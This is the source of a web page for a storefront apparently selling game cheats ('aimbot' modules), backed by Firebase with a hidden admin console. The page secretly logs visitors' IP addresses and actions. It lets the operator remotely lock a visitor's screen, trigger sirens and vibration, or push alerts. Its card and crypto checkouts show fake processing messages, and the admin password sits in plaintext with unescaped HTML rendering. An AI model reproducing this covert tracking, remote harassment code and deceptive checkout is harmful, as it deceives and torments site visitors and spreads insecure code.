<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MAXIOM R4 | PRESTIGE GOLD EDITION</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <script>
        /* * ==========================================
         * SYSTEM CORE CONFIGURATION
         * ==========================================
         */
        const firebaseConfig = {
            apiKey: "AIzaSyDE6qMplWktZASB2AjUKuY_dSRCUKiZyOA",
            authDomain: "maxiom-r3.firebaseapp.com",
            databaseURL: "https://maxiom-r3-default-rtdb.firebaseio.com",
            projectId: "maxiom-r3",
            storageBucket: "maxiom-r3.firebasestorage.app",
            messagingSenderId: "221473460329",
            appId: "1:221473460329:web:21a278a86cfdcff8b1d2f8",
            measurementId: "G-82WFV6S568"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // SHIELD: IP BLACKLIST & SECURITY
        (function() {
            const checkBans = async () => {
                try {
                    const r = await fetch('https://api.ipify.org?format=json');
                    const d = await r.json();
                    const userIP = d.ip;
                    db.ref('banned_ips').on('value', (snap) => {
                        const list = snap.val() || [];
                        if(list.includes(userIP)) {
                            window.stop();
                            document.documentElement.innerHTML = "";
                            alert("CRITICAL ERROR: ACCESS DENIED BY SYSTEM ADMINISTRATOR");
                            window.location.href = "about:blank";
                        }
                    });
                } catch(e) { console.warn("Security Shield: Offline Mode"); }
            };
            checkBans();

            // PAYPAL ENGINE INJECTION
            db.ref('settings/paypal_id').once('value', (snap) => {
                const savedID = snap.val() || "test";
                const script = document.createElement('script');
                script.src = `https://www.paypal.com/sdk/js?client-id=${savedID}&currency=USD`;
                document.head.appendChild(script);
            });
        })();
    </script>

    <style>
        /* * ==========================================
         * CSS VARIABLES & THEME TOKENS
         * ==========================================
         */
        :root {
            --primary: #ffd700;
            --secondary: #ff0000;
            --matrix: rgba(0, 255, 65, 0.6);
            --bg-main: #050505;
            --glass: rgba(0, 0, 0, 0.95);
            --price-gold: #ffcc00;
            --terminal-green: #00ff41;
            --rare-gold-gradient: linear-gradient(135deg, #8a6d3b 0%, #f1da36 25%, #fdf5a6 50%, #f1da36 75%, #8a6d3b 100%);
        }

        /* * ==========================================
         * ANIMATIONS & FX
         * ==========================================
         */
        @keyframes screen-glitch {
            0% { transform: translate(0); }
            10% { transform: translate(-4px, 2px); filter: hue-rotate(45deg); }
            20% { transform: translate(4px, -2px); filter: brightness(1.2); }
            30% { transform: translate(-2px, 0); }
            100% { transform: translate(0); }
        }
        .glitching { animation: screen-glitch 0.2s infinite; }

        @keyframes gold-shimmer {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* * ==========================================
         * BASE UI STYLING
         * ==========================================
         */
        * { cursor: crosshair !important; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        body { margin: 0; font-family: 'Courier New', monospace; color: white; background: var(--bg-main); transition: 0.5s; overflow-x: hidden; padding-bottom: 100px; }
        
        #input-lock-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000000; background: rgba(0,0,0,0.6); cursor: not-allowed !important; }
        #global-alert-banner { display: none; position: fixed; top: 0; left: 0; width: 100%; background: var(--secondary); color: white; padding: 15px; z-index: 100000; font-weight: bold; border-bottom: 3px solid #fff; text-align: center; font-size: 20px; }

        /* * ==========================================
         * LOADER SYSTEM
         * ==========================================
         */
        #loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .terminal-loader { width: 85%; max-width: 800px; background: #000; border: 2px solid var(--terminal-green); padding: 30px; box-shadow: 0 0 50px rgba(0, 255, 65, 0.2); }
        .skull-ascii { color: var(--primary); font-size: 10px; line-height: 10px; white-space: pre; margin-bottom: 25px; text-align: center; }
        #load-logs { color: var(--terminal-green); height: 180px; overflow: hidden; font-size: 14px; line-height: 1.5; }
        .load-bar-container { width: 100%; height: 15px; background: #111; border: 1px solid var(--terminal-green); margin-top: 30px; }
        #load-bar { width: 0%; height: 100%; background: var(--terminal-green); transition: width 0.4s; box-shadow: 0 0 15px var(--terminal-green); }

        /* * ==========================================
         * NAVIGATION & HUD
         * ==========================================
         */
        .top-nav { position: fixed; top: 25px; left: 25px; z-index: 4000; display: flex; gap: 20px; }
        .ui-btn { padding: 14px 24px; background: var(--primary); color: #000; border: 2px solid #fff; font-weight: bold; text-transform: uppercase; cursor: pointer; transition: 0.3s; font-family: 'Courier New', monospace; }
        .ui-btn:hover { background: #fff; transform: translateY(-3px); box-shadow: 0 5px 15px var(--primary); }
        
        .floating-cart { position: fixed; top: 25px; right: 25px; background: var(--primary); width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 10000; box-shadow: 0 0 35px var(--primary); border: 4px solid #fff; font-size: 30px; }
        .cart-count { position: absolute; top: -5px; right: -5px; background: var(--secondary); color: white; font-size: 18px; padding: 5px 11px; border-radius: 50%; border: 2px solid white; }

        /* * ==========================================
         * SHOP COMPONENTS
         * ==========================================
         */
        #global-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; background: var(--bg-main); }
        .header-container { padding: 80px 0; text-align: center; }
        header { font-size: 65px; font-weight: 900; color: var(--primary); text-shadow: 0 0 35px var(--primary); letter-spacing: 15px; }
        .cat-label { margin: 60px auto; padding: 25px; background: var(--glass); border-top: 3px solid var(--primary); border-bottom: 3px solid var(--primary); max-width: 1100px; font-size: 35px; font-weight: bold; color: var(--primary); letter-spacing: 8px; text-align: center; }
        .product-grid { display: flex; flex-wrap: wrap; justify-content: center; gap: 40px; padding: 40px; }
        .product { background: var(--glass); padding: 30px; width: 300px; border: 1px solid #333; border-radius: 15px; transition: 0.4s; position: relative; text-align: center; }
        .product:hover { transform: scale(1.08); border-color: var(--primary); box-shadow: 0 0 30px rgba(255, 215, 0, 0.2); }
        .product h3 { font-size: 22px; margin: 15px 0; color: #fff; }

        /* * ==========================================
         * PAGE 3: THE GOLDEN GATEWAY
         * ==========================================
         */
        #page-3 {
            display: none;
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: var(--rare-gold-gradient);
            background-size: 400% 400%;
            animation: gold-shimmer 15s ease infinite;
            z-index: 15000; padding: 50px; overflow-y: auto; color: #000;
        }
        .page3-content { max-width: 800px; margin: 0 auto; }
        .payment-card {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px; padding: 40px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.6); border: 8px solid #000;
        }
        .method-box {
            border: 3px solid #ddd; border-radius: 12px; padding: 20px; margin-bottom: 20px;
            cursor: pointer; transition: 0.3s; display: flex; align-items: center; gap: 20px;
            background: #fff;
        }
        .method-box:hover { transform: translateX(10px); border-color: #aa771c; }
        .method-box.active { border-color: #000; background: #fffde7; box-shadow: inset 0 0 10px rgba(0,0,0,0.1); }
        .method-icon { font-size: 35px; }
        .method-info strong { font-size: 20px; display: block; }
        .crypto-address-box {
            background: #111; color: #ffd700; padding: 20px; border-radius: 8px;
            font-family: 'Courier New', monospace; font-size: 14px; word-break: break-all; 
            margin-top: 15px; border: 2px dashed #ffd700;
        }

        /* * ==========================================
         * ADMIN INTERFACE (ROOT)
         * ==========================================
         */
        .admin-box { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 20000; padding: 50px; overflow-y: auto; text-align: left; }
        .admin-layout { display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 30px; }
        .panel-box { background: #0d0d0d; border: 1px solid #222; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .panel-box h3 { color: var(--primary); text-transform: uppercase; margin-bottom: 25px; border-bottom: 2px solid #222; padding-bottom: 10px; font-size: 22px; }
        
        input, select, textarea { background: #1a1a1a; border: 1px solid #333; color: #fff; padding: 15px; margin: 10px 0; width: 100%; border-radius: 8px; font-size: 16px; font-family: 'Courier New', monospace; }
        input:focus { border-color: var(--primary); }
        label { color: #888; font-size: 12px; text-transform: uppercase; margin-top: 10px; display: block; }

        /* * ==========================================
         * RESPONSIVE DESIGN
         * ==========================================
         */
        @media (max-width: 768px) {
            header { font-size: 38px; letter-spacing: 5px; }
            .admin-layout { grid-template-columns: 1fr; }
            #page-3 { padding: 20px; }
            .payment-card { padding: 20px; }
        }
    </style>
</head>
<body onclick="startAudio()">

<div id="input-lock-overlay"></div>
<div id="global-alert-banner"></div>

<div id="loader-overlay">
    <div class="terminal-loader">
        <div class="skull-ascii">
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@#   #@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@       @@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@#   #@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@  @@@@@@@@@@@@  @@@@@@@@@@@@@@
    @@@@@@@@@@  @@@@@@@@@@@@  @@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        </div>
        <div id="load-logs"></div>
        <div class="load-bar-container"><div id="load-bar"></div></div>
    </div>
</div>

<canvas id="global-canvas"></canvas>

<div class="top-nav">
    <button class="ui-btn" onclick="showShop()" style="background:#333; color:#fff; border-color:#555;">[ HOME ]</button>
    <button class="ui-btn" onclick="toggleMusic(event)" id="music-btn">üîä MUSIC: ON</button>
</div>

<div class="floating-cart" onclick="showPage3()">üõí <span class="cart-count" id="cart-count">0</span></div>

<div class="header-container">
    <header id="main-header-text">SPR SHOP ARK R4</header>
</div>

<div id="shop-page">
    <div class="cat-label">ANDROID ELITE MODULES</div>
    <div id="android-grid" class="product-grid"></div>
    
    <div class="cat-label">IOS OVERRIDE MODULES</div>
    <div id="ios-grid" class="product-grid"></div>
</div>

<div id="page-3">
    <div class="page3-content">
        <div style="text-align: center; margin-bottom: 40px;">
            <button onclick="showShop()" class="ui-btn" style="background:#000; color:#fff; border-radius: 50px; padding: 15px 40px;">‚¨Ö EXIT TO SHOP</button>
            <h1 style="font-size: 55px; letter-spacing: 12px; font-weight: 900; margin-top: 30px; text-shadow: 2px 2px 0px #fff;">THE VAULT</h1>
            <p style="font-weight: bold; font-size: 18px;">PREMIUM ASSET ACQUISITION GATEWAY</p>
        </div>

        <div class="payment-card">
            <h2 style="text-align: center; border-bottom: 3px solid #000; padding-bottom: 15px; margin-bottom: 30px; font-size: 28px;">SECURE CHECKOUT</h2>
            
            <div id="cart-summary" style="margin: 20px 0; font-size: 18px; border-left: 5px solid #000; padding-left: 20px;">
                </div>
            
            <h1 id="p3-total" style="text-align: center; font-size: 50px; margin: 30px 0; font-weight: 900; color: #000;">TOTAL: $0.00</h1>

            <div class="method-box active" id="btn-pay-paypal" onclick="selectMethod('paypal')">
                <div class="method-icon">üîµ</div>
                <div class="method-info">
                    <strong>PAYPAL / DEBIT CARD</strong>
                    <small>Instant Delivery via Secure Merchant API</small>
                </div>
            </div>
            <div id="paypal-area" style="padding: 10px 0;">
                <div id="paypal-button-container"></div>
            </div>

            <div class="method-box" id="btn-pay-cc" onclick="selectMethod('cc')">
                <div class="method-icon">üí≥</div>
                <div class="method-info">
                    <strong>DIRECT CARD PAYMENT</strong>
                    <small>Encrypted Credit/Debit Card Bridge</small>
                </div>
            </div>
            <div id="cc-area" style="display:none; padding: 20px; background: #f9f9f9; border-radius: 10px; margin-bottom: 20px;">
                <label style="color:#000">CARD NUMBER</label>
                <input type="text" placeholder="0000 0000 0000 0000" style="background:#fff; color:#000; border: 2px solid #ddd;">
                <div style="display:flex; gap:20px;">
                    <div style="flex:1">
                        <label style="color:#000">EXPIRY</label>
                        <input type="text" placeholder="MM / YY" style="background:#fff; color:#000; border: 2px solid #ddd;">
                    </div>
                    <div style="flex:1">
                        <label style="color:#000">CVC</label>
                        <input type="text" placeholder="123" style="background:#fff; color:#000; border: 2px solid #ddd;">
                    </div>
                </div>
                <button class="ui-btn" style="width:100%; background:#000; color:#fff; margin-top: 20px;" onclick="alert('Card Processing Service: Connecting...')">AUTHORIZE PAYMENT</button>
            </div>

            <div class="method-box" id="btn-pay-crypto" onclick="selectMethod('crypto')">
                <div class="method-icon">‚Çø</div>
                <div class="method-info">
                    <strong>CRYPTOCURRENCY</strong>
                    <small>BTC, LTC, USDT (Manual Verification)</small>
                </div>
            </div>
            <div id="crypto-area" style="display:none; padding: 20px; background: #f9f9f9; border-radius: 10px; margin-bottom: 20px;">
                <p style="font-weight: bold; margin-bottom: 10px;">TRANSFER TOTAL TO ONE OF THE FOLLOWING:</p>
                
                <label style="color:#000">BITCOIN (BTC)</label>
                <div class="crypto-address-box" id="btc-display">Waiting for Admin...</div>
                
                <label style="color:#000; margin-top: 15px;">LITECOIN (LTC)</label>
                <div class="crypto-address-box" id="ltc-display">Waiting for Admin...</div>
                
                <div style="margin-top: 25px; padding: 15px; border: 1px solid #000; background: #fff;">
                    <p style="font-size: 13px; margin: 0;">After sending, please contact admin with your Transaction ID to receive your download link.</p>
                </div>
                <button class="ui-btn" style="width:100%; margin-top: 20px; background:#f7931a; color:#fff; border:none;" onclick="confirmCrypto()">I HAVE SENT THE FUNDS</button>
            </div>
        </div>
        <p style="text-align: center; margin-top: 30px; font-weight: bold;">SECURITY VERIFIED BY ARK R4 ENCRYPTION</p>
    </div>
</div>

<div class="admin-box" id="admin-terminal">
    <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--secondary); padding-bottom: 20px; margin-bottom: 50px;">
        <h2 style="color:var(--secondary); margin:0; font-size:35px; letter-spacing:8px;">ARK_ROOT_COMMAND</h2>
        <button onclick="closeAdmin()" class="ui-btn" style="background:red; color:white; border:none; padding: 10px 30px;">DISCONNECT</button>
    </div>

    <div id="login-section" style="text-align:center; padding-top:10vh;">
        <h3 style="margin-bottom: 30px; letter-spacing: 3px;">ENCRYPTED AUTHENTICATION</h3>
        <input type="password" id="admin-pass" placeholder="ENTER MASTER ROOT KEY" style="max-width:600px; height:70px; font-size: 30px; text-align:center; border: 2px solid var(--secondary);">
        <br>
        <button onclick="login()" class="ui-btn" style="width:600px; height:70px; margin-top:40px; font-size: 22px;">DECRYPT SYSTEM</button>
    </div>

    <div id="admin-controls" style="display:none;" class="admin-layout">
        
        <div class="panel-box" style="border: 2px solid var(--primary);">
            <h3>üí∞ WALLET COMMAND CENTER</h3>
            <p style="font-size:12px; color:#888; margin-bottom: 20px;">Configure addresses for Page 3 Golden Gateway</p>
            
            <label>BITCOIN (BTC) RECEIVING ADDRESS</label>
            <input type="text" id="wallet-btc" placeholder="bc1q...">
            
            <label>LITECOIN (LTC) RECEIVING ADDRESS</label>
            <input type="text" id="wallet-ltc" placeholder="L...">
            
            <label>PAYPAL MERCHANT CLIENT ID</label>
            <input type="text" id="wallet-paypal" placeholder="Enter PayPal App Client ID">
            
            <button onclick="saveWallets()" class="ui-btn" style="width:100%; margin-top:20px; height: 60px; font-size: 18px;">UPDATE GLOBAL GATEWAYS</button>
        </div>

        <div class="panel-box">
            <h3>‚öíÔ∏è ARSENAL FORGE</h3>
            <input type="hidden" id="edit-index" value="-1">
            
            <label>ASSET NAME</label>
            <input type="text" id="p-name" placeholder="e.g. Aimbot Elite v4">
            
            <label>VALUATION (USD)</label>
            <input type="number" id="p-price" placeholder="99.99">
            
            <label>TARGET PLATFORM</label>
            <select id="p-cat">
                <option value="android">Android Module</option>
                <option value="ios">iOS Module</option>
            </select>
            
            <label>TECHNICAL DESCRIPTION</label>
            <textarea id="p-desc" placeholder="Enter specs..." style="height: 120px;"></textarea>
            
            <button id="forge-btn" onclick="addProduct()" class="ui-btn" style="width:100%; margin-top: 15px;">DEPLOY TO ARK GRID</button>
            
            <div id="admin-asset-list" style="margin-top:30px; border-top: 1px solid #333; padding-top: 20px; max-height: 300px; overflow-y: auto;">
                </div>
        </div>

        <div class="panel-box" style="border: 2px solid var(--secondary);">
            <h3 style="color:var(--secondary);">üíÄ BEAST OVERRIDE (R4)</h3>
            <label>ACTIVE TARGET IDENTIFIER</label>
            <input type="text" id="manual-target-id" placeholder="ENTER USER ID (e.g. 192)">
            
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:15px; margin-top: 20px;">
                <button onclick="sendPower('siren')" class="ui-btn" style="background:#ff4400; color:white; border:none;">TRIGGER SIREN</button>
                <button onclick="sendPower('lock')" class="ui-btn" style="background:red; color:white; border:none;">SYSTEM LOCK</button>
                <button onclick="sendPower('unlock')" class="ui-btn" style="background:lime; color:black; border:none;">SYSTEM UNLOCK</button>
                <button onclick="sendPower('vibrate')" class="ui-btn" style="background:white; color:black; border:none;">VIBRATE</button>
            </div>

            <label style="margin-top: 30px;">REMOTE FLASH-BANG MESSAGE</label>
            <input type="text" id="alert-msg" placeholder="Warning message for user...">
            <button onclick="sendFlashBang()" class="ui-btn" style="width:100%; background:purple; color:white; border:none;">DEPLOY FLASH-BANG</button>
        </div>

        <div class="panel-box">
            <h3>üì° LIVE INTEL FEED</h3>
            <div id="pay-attempts-list" style="background:#000; border:1px solid #222; height:350px; overflow-y:auto; padding:15px; font-size:12px; color: lime; font-family: monospace;">
                </div>
            <button onclick="db.ref('intel').set(null)" class="ui-btn" style="width:100%; margin-top: 15px; background: maroon; color: white;">WIPE DATA LOGS</button>
        </div>

    </div>
</div>

<audio id="hacker-music" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"></audio>
<audio id="siren-sound" src="https://www.myinstants.com/media/sounds/strobe-warning.mp3"></audio>

<script>
/* * ==========================================
 * CORE LOGIC ARCHITECTURE
 * ==========================================
 */
let products = [];
let cart = [];
let isAdmin = false;
let userIP = "Scanning...";
let userID = "0";
let musicStarted = false;

// --- PAGE NAVIGATION ---
function showShop() { 
    document.getElementById('shop-page').style.display = 'block'; 
    document.getElementById('page-3').style.display = 'none'; 
    document.body.style.background = "var(--bg-main)";
}

function showPage3() {
    if(cart.length === 0) {
        alert("YOUR ARSENAL IS EMPTY. ADD MODULES FIRST.");
        return;
    }
    document.getElementById('shop-page').style.display = 'none'; 
    document.getElementById('page-3').style.display = 'block'; 
    renderPage3();
}

function closeAdmin() { 
    document.getElementById('admin-terminal').style.display = 'none'; 
}

// --- PAYMENT PAGE (PAGE 3) LOGIC ---
function selectMethod(m) {
    // UI Switching
    document.getElementById('paypal-area').style.display = (m === 'paypal') ? 'block' : 'none';
    document.getElementById('cc-area').style.display = (m === 'cc') ? 'block' : 'none';
    document.getElementById('crypto-area').style.display = (m === 'crypto') ? 'block' : 'none';
    
    // Toggle Active Class
    document.getElementById('btn-pay-paypal').classList.toggle('active', m === 'paypal');
    document.getElementById('btn-pay-cc').classList.toggle('active', m === 'cc');
    document.getElementById('btn-pay-crypto').classList.toggle('active', m === 'crypto');
}

function renderPage3() {
    let total = 0;
    let summaryHtml = "";
    
    cart.forEach(item => { 
        summaryHtml += `<div style="margin-bottom: 10px;">‚Ä¢ ${item.name} <span style="float:right">$${item.price}</span></div>`; 
        total += parseFloat(item.price); 
    });
    
    document.getElementById('cart-summary').innerHTML = summaryHtml;
    document.getElementById('p3-total').innerText = "TOTAL: $" + total.toFixed(2);
    
    // Load Wallet addresses from Firebase for Page 3
    db.ref('settings/wallets').once('value', snap => {
        const wallets = snap.val() || {};
        document.getElementById('btc-display').innerText = wallets.btc || "ADDRESS NOT CONFIGURED";
        document.getElementById('ltc-display').innerText = wallets.ltc || "ADDRESS NOT CONFIGURED";
    });
}

function confirmCrypto() {
    alert("TRANSACTION BROADCASTED. Monitoring Blockchain for confirmation. Do not close this session.");
    db.ref('intel').push({
        id: Date.now(),
        owner: userID,
        text: `CRYPTO_PAYMENT_INITIATED | IP: ${userIP} | Total: ${document.getElementById('p3-total').innerText}`
    });
}

// --- ADMIN SYSTEM LOGIC ---
function login() {
    const pass = document.getElementById('admin-pass').value;
    if(pass === "spartytop1") {
        isAdmin = true;
        document.getElementById('admin-controls').style.display = 'grid';
        document.getElementById('login-section').style.display = 'none';
        
        // Sync Admin Wallet View
        db.ref('settings/wallets').on('value', snap => {
            const w = snap.val() || {};
            document.getElementById('wallet-btc').value = w.btc || "";
            document.getElementById('wallet-ltc').value = w.ltc || "";
            document.getElementById('wallet-paypal').value = w.paypal || "";
        });

        // Sync Intel Logs
        db.ref('intel').on('value', snap => {
            const logs = snap.val() || {};
            const logBox = document.getElementById('pay-attempts-list');
            logBox.innerHTML = Object.keys(logs).reverse().map(key => {
                const entry = logs[key];
                return `<div style="margin-bottom:10px; border-bottom:1px solid #111; padding-bottom:5px;">
                            <span style="color:#888;">[${new Date(entry.id).toLocaleTimeString()}]</span> User_${entry.owner}: ${entry.text}
                            <button onclick="targetUser('${entry.owner}')" style="background:#222; color:cyan; border:none; padding:2px 5px; font-size:10px; cursor:pointer; margin-left:10px;">BRIDGE</button>
                        </div>`;
            }).join('');
        });

        renderAdminAssets();
    } else {
        alert("ACCESS DENIED: INVALID ROOT KEY");
    }
}

function saveWallets() {
    const data = {
        btc: document.getElementById('wallet-btc').value,
        ltc: document.getElementById('wallet-ltc').value,
        paypal: document.getElementById('wallet-paypal').value
    };
    db.ref('settings/wallets').set(data);
    db.ref('settings/paypal_id').set(data.paypal);
    alert("SYSTEM UPDATED: GLOBAL GATEWAYS RECONFIGURED");
}

function targetUser(id) {
    document.getElementById('manual-target-id').value = id;
    alert("BRIDGE ESTABLISHED WITH USER: " + id);
}

// --- ARSENAL FORGE (CRUD) ---
function addProduct() {
    const name = document.getElementById('p-name').value;
    const price = document.getElementById('p-price').value;
    const cat = document.getElementById('p-cat').value;
    const desc = document.getElementById('p-desc').value;
    const idx = document.getElementById('edit-index').value;

    if(!name || !price) return alert("MISSING ASSET DATA");

    const newAsset = { name, price, category: cat, desc };

    if(idx == "-1") {
        products.push(newAsset);
    } else {
        products[idx] = newAsset;
        document.getElementById('edit-index').value = "-1";
        document.getElementById('forge-btn').innerText = "DEPLOY TO ARK GRID";
    }

    db.ref('products').set(products).then(() => {
        alert("ARK UPDATED: MODULE DEPLOYED");
        resetForge();
    });
}

function resetForge() {
    document.getElementById('p-name').value = "";
    document.getElementById('p-price').value = "";
    document.getElementById('p-desc').value = "";
}

function renderAdminAssets() {
    const list = document.getElementById('admin-asset-list');
    list.innerHTML = products.map((p, i) => `
        <div style="background:#111; padding:15px; margin-bottom:10px; border-left:4px solid var(--primary); display:flex; justify-content:space-between;">
            <div><strong>${p.name}</strong> ($${p.price})</div>
            <div>
                <button onclick="editProduct(${i})" style="color:lime; background:none; border:none; cursor:pointer;">[EDIT]</button>
                <button onclick="deleteProduct(${i})" style="color:red; background:none; border:none; cursor:pointer; margin-left:10px;">[DELETE]</button>
            </div>
        </div>
    `).join('');
}

function editProduct(i) {
    const p = products[i];
    document.getElementById('p-name').value = p.name;
    document.getElementById('p-price').value = p.price;
    document.getElementById('p-cat').value = p.category;
    document.getElementById('p-desc').value = p.desc;
    document.getElementById('edit-index').value = i;
    document.getElementById('forge-btn').innerText = "UPDATE ASSET";
}

function deleteProduct(i) {
    if(confirm("PERMANENTLY DELETE THIS ASSET?")) {
        products.splice(i, 1);
        db.ref('products').set(products);
    }
}

// --- BEAST OVERRIDE (REMOTE) ---
function sendPower(type) {
    const target = document.getElementById('manual-target-id').value;
    if(!target) return alert("NO TARGET SPECIFIED");
    db.ref(`private_chats/${target}/power`).set({ type: type, time: Date.now() });
    alert("REMOTE COMMAND [" + type.toUpperCase() + "] DEPLOYED TO USER_" + target);
}

function sendFlashBang() {
    const target = document.getElementById('manual-target-id').value;
    const msg = document.getElementById('alert-msg').value;
    if(!target || !msg) return alert("MISSING TARGET OR MESSAGE");
    db.ref(`private_chats/${target}/alert`).set({ msg: msg, time: Date.now() });
    alert("FLASH-BANG TRANSMITTED");
}

// --- VISITOR SHOP LOGIC ---
function addToCart(i) {
    cart.push(products[i]);
    document.getElementById('cart-count').innerText = cart.length;
    db.ref('intel').push({
        id: Date.now(),
        owner: userID,
        text: `INTERACTION | ADDED_TO_CART: ${products[i].name}`
    });
}

// --- MATRIX ENGINE ---
const canvas = document.getElementById('global-canvas');
const ctx = canvas.getContext('2d');
let drops = [];

function initMatrix() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const columns = canvas.width / 20;
    drops = Array(Math.floor(columns)).fill(1);
}

function drawMatrix() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#ffd700";
    ctx.font = "15px monospace";
    for(let i = 0; i < drops.length; i++) {
        const text = String.fromCharCode(Math.random() * 128);
        ctx.fillText(text, i * 20, drops[i] * 20);
        if(drops[i] * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}

// --- AUDIO SYSTEM ---
function toggleMusic(e) {
    if(e) e.stopPropagation();
    const m = document.getElementById('hacker-music');
    const btn = document.getElementById('music-btn');
    if(m.paused) { m.play(); btn.innerText = "üîä MUSIC: ON"; }
    else { m.pause(); btn.innerText = "üîá MUSIC: OFF"; }
}

function startAudio() {
    if(!musicStarted) {
        document.getElementById('hacker-music').play().catch(()=>{});
        musicStarted = true;
    }
}

// --- BOOT PROCESS ---
window.onload = () => {
    // Identity Verification
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(d => {
            userIP = d.ip;
            userID = userIP.split('.')[0] + userIP.split('.')[1];
            db.ref('presence/' + userID).set(true);
            db.ref('presence/' + userID).onDisconnect().remove();
        });

    // Matrix Start
    initMatrix();
    setInterval(drawMatrix, 50);
    window.onresize = initMatrix;

    // Database Sync: Products
    db.ref('products').on('value', snap => {
        products = snap.val() || [];
        const aG = document.getElementById("android-grid");
        const iG = document.getElementById("ios-grid");
        if(aG && iG) {
            aG.innerHTML = ""; iG.innerHTML = "";
            products.forEach((p, i) => {
                if(!p) return;
                const div = document.createElement("div");
                div.className = "product";
                div.innerHTML = `
                    <h3>${p.name}</h3>
                    <p style="font-size:12px; color:#888;">${p.desc || 'Elite Module'}</p>
                    <div style="color:var(--price-gold); font-size: 24px; font-weight: bold; margin: 15px 0;">$${p.price}</div>
                    <button onclick="addToCart(${i})" class="ui-btn" style="width:100%;">ACQUIRE</button>
                `;
                p.category === "ios" ? iG.appendChild(div) : aG.appendChild(div);
            });
        }
        if(isAdmin) renderAdminAssets();
    });

    // Remote Control Listeners
    db.ref(`private_chats/${userID}/power`).on('value', snap => {
        const p = snap.val();
        if(!p) return;
        if(p.type === 'siren') document.getElementById('siren-sound').play();
        if(p.type === 'lock') document.getElementById('input-lock-overlay').style.display = 'block';
        if(p.type === 'unlock') document.getElementById('input-lock-overlay').style.display = 'none';
        if(p.type === 'vibrate') { if(navigator.vibrate) navigator.vibrate([500, 200, 500]); }
        setTimeout(() => db.ref(`private_chats/${userID}/power`).remove(), 2000);
    });

    db.ref(`private_chats/${userID}/alert`).on('value', snap => {
        if(snap.val()) {
            alert("‚ö†Ô∏è SYSTEM MESSAGE: " + snap.val().msg);
            db.ref(`private_chats/${userID}/alert`).remove();
        }
    });

    // Keys
    window.addEventListener('keydown', (e) => {
        if(e.key === "End") document.getElementById('admin-terminal').style.display = 'block';
    });

    // Loader Simulation
    const l = document.getElementById('load-logs');
    const lines = [
        "> INITIALIZING ARK R4 KERNEL...",
        "> ESTABLISHING FIREBASE TUNNEL...",
        "> SYNCING GOLDEN GATEWAY NODES...",
        "> DEPLOYING BEAST OVERRIDE MASK...",
        "> ENCRYPTION LAYERS: ACTIVE",
        "> SYSTEM STATUS: PRESTIGE"
    ];
    let step = 0;
    let loop = setInterval(() => {
        if(step < lines.length) {
            l.innerHTML += `<div>${lines[step]}</div>`;
            document.getElementById('load-bar').style.width = ((step + 1) * (100 / lines.length)) + "%";
            step++;
        } else {
            clearInterval(loop);
            setTimeout(() => document.getElementById('loader-overlay').style.display = 'none', 1000);
        }
    }, 500);
};
</script>
</body>
</html>
